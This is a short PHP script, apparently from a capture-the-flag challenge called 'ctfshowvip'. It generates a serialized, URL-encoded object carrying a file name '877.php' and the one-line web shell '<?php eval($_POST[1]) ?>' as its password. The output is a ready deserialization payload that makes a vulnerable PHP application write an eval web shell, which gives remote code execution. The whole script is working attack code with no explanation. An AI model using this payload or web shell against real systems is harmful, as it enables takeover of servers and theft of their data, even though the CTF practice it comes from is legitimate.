<?php
	class ctfshowvip{
		public $username;
		public $password;

		public function __construct($u,$p){
			$this->username=$u;
			$this->password=$p;
		}
	}

	$a = new ctfshowvip('877.php','<?php eval($_POST[1]) ?>');
	echo urlencode(serialize($a));
?>